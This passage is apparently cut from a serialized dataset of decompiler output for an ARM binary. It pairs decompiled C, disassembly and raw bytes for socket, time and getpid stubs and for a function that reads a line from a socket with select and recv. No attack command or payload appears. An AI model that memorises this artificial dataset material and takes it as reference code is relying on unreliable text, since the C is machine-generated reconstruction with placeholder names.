S'3c 30 9f e5\n00 00 53 e3\n04 e0 2d e5\n34 00 9f e5\n34 10 9f e5\n0f e0 a0 11\n03 f0 a0 11\n2c 00 9f e5\n00 30 90 e5\n00 00 53 e3\n24 30 9f e5\n04 f0 9d 04\n00 00 53 e3\n04 f0 9d 04\n0f e0 a0 e1\n03 f0 a0 e1\n04 f0 9d e4\n'
p376
S'.text:00008b50\n.text:00008b54\n.text:00008b58\n.text:00008b5c\n.text:00008b60\n.text:00008b64\n.text:00008b68\n.text:00008b6c\n.text:00008b70\n.text:00008b74\n.text:00008b78\n.text:00008b7c\n.text:00008b80\n.text:00008b84\n.text:00008b88\n.text:00008b8c\n.text:00008b90\n'
p377
tp378
sS'socket'
p379
(S'\n__stdcall socket(int __domain, int __type, int __protocol)\n'
p380
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000aint socket(int __domain,int __type,int __protocol)\u000a\u000a{\u000a  int iVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x00008970. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  iVar1 = (*(code *)PTR_LAB_000132f4)();\u000a  return iVar1;\u000a}\u000a\u000a
p381
S'adr r12,0x8970\nadd r12,r12,#0xa000\nldr pc,[r12,#0x984]!\n'
p382
S'00 c6 8f e2\n0a ca 8c e2\n84 f9 bc e5\n'
p383
S'.plt:00008968\n.plt:0000896c\n.plt:00008970\n'
p384
tp385
sS'time'
p386
(S'\n__stdcall time(time_t * __timer)\n'
p387
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000atime_t time(time_t *__timer)\u000a\u000a{\u000a  time_t tVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x00008a60. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  tVar1 = (*(code *)PTR_LAB_00013344)();\u000a  return tVar1;\u000a}\u000a\u000a
p388
S'adr r12,0x8a60\nadd r12,r12,#0xa000\nldr pc,[r12,#0x8e4]!\n'
p389
S'00 c6 8f e2\n0a ca 8c e2\ne4 f8 bc e5\n'
p390
S'.plt:00008a58\n.plt:00008a5c\n.plt:00008a60\n'
p391
tp392
sS'FUN_00008bec'
p393
(S'\n__stdcall FUN_00008bec()\n'
p394
V\u000aint FUN_00008bec(uint uParm1,char *pcParm2,size_t sParm3)\u000a\u000a{\u000a  uint uVar1;\u000a  uint uVar2;\u000a  undefined *puVar3;\u000a  ssize_t sVar4;\u000a  int iVar5;\u000a  char *pcVar6;\u000a  int iVar7;\u000a  uint local_b0 [32];\u000a  timeval local_30;\u000a  char local_25;\u000a  \u000a  iVar5 = 0;\u000a  local_30.tv_sec = 0x1e;\u000a  local_30.tv_usec = 0;\u000a  memset(pcParm2,0,sParm3);\u000a  iVar7 = 0;\u000a  do {\u000a    *(undefined4 *)((int)((fd_set *)local_b0)->fds_bits + iVar5) = 0;\u000a    iVar5 = iVar5 + 4;\u000a  } while (iVar5 != 0x80);\u000a  uVar2 = 1 << (uParm1 & 0x1f);\u000a  uVar1 = uParm1 >> 5;\u000a  local_b0[uVar1] = local_b0[uVar1] | uVar2;\u000a  iVar5 = select(uParm1 + 1,(fd_set *)local_b0,(fd_set *)0x0,(fd_set *)local_b0,&local_30);\u000a  if (iVar5 < 1) {\u000a    do {\u000a      local_30.tv_sec = 0x1e;\u000a      iVar5 = 0;\u000a      do {\u000a        *(undefined4 *)((int)((fd_set *)local_b0)->fds_bits + iVar5) = 0;\u000a        iVar5 = iVar5 + 4;\u000a      } while (iVar5 != 0x80);\u000a      local_b0[uVar1] = uVar2 | local_b0[uVar1];\u000a      local_30.tv_usec = 0;\u000a      iVar5 = select(uParm1 + 1,(fd_set *)local_b0,(fd_set *)0x0,(fd_set *)local_b0,&local_30);\u000a    } while ((iVar5 < 1) && (iVar7 = iVar7 + 1, iVar7 != 10));\u000a  }\u000a  puVar3 = PTR_DAT_00008d74;\u000a  if ((int)sParm3 < 2) {\u000a    iVar5 = 0;\u000a  }\u000a  else {\u000a    iVar5 = 0;\u000a    pcVar6 = pcParm2;\u000a    do {\u000a      sVar4 = recv(*(int *)puVar3,&local_25,1,0);\u000a      if (sVar4 != 1) {\u000a        *pcVar6 = 0;\u000a        return 0xffffffff;\u000a      }\u000a      pcParm2 = pcVar6 + 1;\u000a      *pcVar6 = local_25;\u000a    } while ((local_25 != '\u005cn') && (iVar5 = iVar5 + 1, pcVar6 = pcParm2, iVar5 != sParm3 - 1));\u000a  }\u000a  *pcParm2 = 0;\u000a  return iVar5;\u000a}\u000a\u000a
p395
S'stmdb sp!,{ r4 r5 r6 r7 r8 r9 r10 r11 lr }\nmov r4,#0x0\nsub sp,sp,#0x94\nmov r3,#0x1e\ncpy r9,r1\ncpy r8,r0\ncpy r0,r1\ncpy r1,r4\nstr r3,[sp,#0x88]\nstr r4,[sp,#0x8c]\nstr r2,[sp,#0x4]\nbl 0x00008a40\nadd r5,sp,#0x8\ncpy r6,r4\nstr r6,[r4,r5]\nadd r4,r4,#0x4\ncmp r4,#0x80\nbne 0x00008c24\nand r1,r8,#0x1f\nmov r2,#0x1\nmov r10,r2, lsl r1\nmov r3,r8, lsr #0x5\nmov r3,r3, lsl #0x2\nadd r2,sp,#0x94\nadd r7,r3,r2\nldr r12,[r7,#-0x8c]\nadd r8,r8,#0x1\norr r12,r12,r10\nstr r12,[r7,#-0x8c]\nadd r11,sp,#0x88\ncpy r0,r8\ncpy r1,r5\ncpy r2,r6\ncpy r3,r5\nstr r11,[sp,#0x0]\nbl 0x00008974\ncmp r0,#0x0\nble 0x00008d0c\nldr r2,[sp,#0x4]\ncmp r2,#0x1\ncpyle r4,r9\nmovle r5,#0x0\nble 0x00008cf8\nldr r8,[0x8d74]\ncpy r4,r9\nsub r6,r2,#0x1\nmov r5,#0x0\nadd r7,sp,#0x93\nb 0x00008ccc\nldrb r3,[sp,#0x93]\ncmp r3,#0xa\nstrb r3,[r4],#0x1\nbeq 0x00008cf8\nadd r5,r5,#0x1\ncmp r5,r6\nbeq 0x00008cf8\nldr r0,[r8,#0x0]\ncpy r1,r7\nmov r2,#0x1\nmov r3,#0x0\nbl 0x00008920\ncmp r0,#0x1\nbeq 0x00008cb0\nmov r3,#0x0\nmvn r5,#0x0\nstrb r3,[r4,#0x0]\nb 0x00008d00\nmov r3,#0x0\nstrb r3,[r4,#0x0]\ncpy r0,r5\nadd sp,sp,#0x94\nldmia sp!,{ r4 r5 r6 r7 r8 r9 r10 r11 pc }\ncmp r6,#0x9\nbgt 0x00008c84\ncpy r4,r6\nmov r3,#0x1e\nstr r3,[sp,#0x88]\nsub r3,r3,#0x1e\nstr r4,[r3,r5]\nadd r3,r3,#0x4\ncmp r3,#0x80\nbne 0x00008d24\nldr r12,[r7,#-0x8c]\norr r12,r10,r12\nstr r12,[r7,#-0x8c]\ncpy r0,r8\ncpy r1,r5\ncpy r2,r4\ncpy r3,r5\nstr r4,[sp,#0x8c]\nstr r11,[sp,#0x0]\nbl 0x00008974\ncmp r0,#0x0\nbgt 0x00008c84\nadd r6,r6,#0x1\ncmp r6,#0xa\nbne 0x00008d18\nb 0x00008c84\n'
p396
S'f0 4f 2d e9\n00 40 a0 e3\n94 d0 4d e2\n1e 30 a0 e3\n01 90 a0 e1\n00 80 a0 e1\n01 00 a0 e1\n04 10 a0 e1\n88 30 8d e5\n8c 40 8d e5\n04 20 8d e5\n88 ff ff eb\n08 50 8d e2\n04 60 a0 e1\n05 60 84 e7\n04 40 84 e2\n80 00 54 e3\nfb ff ff 1a\n1f 10 08 e2\n01 20 a0 e3\n12 a1 a0 e1\na8 32 a0 e1\n03 31 a0 e1\n94 20 8d e2\n02 70 83 e0\n8c c0 17 e5\n01 80 88 e2\n0a c0 8c e1\n8c c0 07 e5\n88 b0 8d e2\n08 00 a0 e1\n05 10 a0 e1\n06 20 a0 e1\n05 30 a0 e1\n00 b0 8d e5\n3d ff ff eb\n00 00 50 e3\n21 00 00 da\n04 20 9d e5\n01 00 52 e3\n09 40 a0 d1\n00 50 a0 d3\n17 00 00 da\nd4 80 9f e5\n09 40 a0 e1\n01 60 42 e2\n00 50 a0 e3\n93 70 8d e2\n06 00 00 ea\n93 30 dd e5\n0a 00 53 e3\n01 30 c4 e4\n0d 00 00 0a\n01 50 85 e2\n06 00 55 e1\n0a 00 00 0a\n00 00 98 e5\n07 10 a0 e1\n01 20 a0 e3\n00 30 a0 e3\n0f ff ff eb\n01 00 50 e3\nf1 ff ff 0a\n00 30 a0 e3\n00 50 e0 e3\n00 30 c4 e5\n01 00 00 ea\n00 30 a0 e3\n00 30 c4 e5\n05 00 a0 e1\n94 d0 8d e2\nf0 8f bd e8\n09 00 56 e3\ndb ff ff ca\n06 40 a0 e1\n1e 30 a0 e3\n88 30 8d e5\n1e 30 43 e2\n05 40 83 e7\n04 30 83 e2\n80 00 53 e3\nfb ff ff 1a\n8c c0 17 e5\n0c c0 8a e1\n8c c0 07 e5\n08 00 a0 e1\n05 10 a0 e1\n04 20 a0 e1\n05 30 a0 e1\n8c 40 8d e5\n00 b0 8d e5\n05 ff ff eb\n00 00 50 e3\nc7 ff ff ca\n01 60 86 e2\n0a 00 56 e3\ne9 ff ff 1a\nc3 ff ff ea\n'
p397
S'.text:00008bec\n.text:00008bf0\n.text:00008bf4\n.text:00008bf8\n.text:00008bfc\n.text:00008c00\n.text:00008c04\n.text:00008c08\n.text:00008c0c\n.text:00008c10\n.text:00008c14\n.text:00008c18\n.text:00008c1c\n.text:00008c20\n.text:00008c24\n.text:00008c28\n.text:00008c2c\n.text:00008c30\n.text:00008c34\n.text:00008c38\n.text:00008c3c\n.text:00008c40\n.text:00008c44\n.text:00008c48\n.text:00008c4c\n.text:00008c50\n.text:00008c54\n.text:00008c58\n.text:00008c5c\n.text:00008c60\n.text:00008c64\n.text:00008c68\n.text:00008c6c\n.text:00008c70\n.text:00008c74\n.text:00008c78\n.text:00008c7c\n.text:00008c80\n.text:00008c84\n.text:00008c88\n.text:00008c8c\n.text:00008c90\n.text:00008c94\n.text:00008c98\n.text:00008c9c\n.text:00008ca0\n.text:00008ca4\n.text:00008ca8\n.text:00008cac\n.text:00008cb0\n.text:00008cb4\n.text:00008cb8\n.text:00008cbc\n.text:00008cc0\n.text:00008cc4\n.text:00008cc8\n.text:00008ccc\n.text:00008cd0\n.text:00008cd4\n.text:00008cd8\n.text:00008cdc\n.text:00008ce0\n.text:00008ce4\n.text:00008ce8\n.text:00008cec\n.text:00008cf0\n.text:00008cf4\n.text:00008cf8\n.text:00008cfc\n.text:00008d00\n.text:00008d04\n.text:00008d08\n.text:00008d0c\n.text:00008d10\n.text:00008d14\n.text:00008d18\n.text:00008d1c\n.text:00008d20\n.text:00008d24\n.text:00008d28\n.text:00008d2c\n.text:00008d30\n.text:00008d34\n.text:00008d38\n.text:00008d3c\n.text:00008d40\n.text:00008d44\n.text:00008d48\n.text:00008d4c\n.text:00008d50\n.text:00008d54\n.text:00008d58\n.text:00008d5c\n.text:00008d60\n.text:00008d64\n.text:00008d68\n.text:00008d6c\n.text:00008d70\n'
p398
tp399
sS'getpid'
p400
(S'\n__stdcall getpid()\n'
p401
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000a__pid_t getpid(void)\u000a\u000a{\u000a  __pid_t _Var1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x00008940. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  _Var1 = (*(code *)PTR_LAB_000132e4)();\u000a  return _Var1;\u000a}\u000a\u000a
p402
S'adr r12,0x8940\nadd r12,r12,#0xa000\nldr pc,[r12,#0x9a4]!\n'
p403
S'00 c6 8f e2\n0a ca 8c e2\na4 f9 bc e5\n'
p404
S'.plt:00008938\n.plt:0000893c\n.plt:00008940\n'
p405
tp406
s.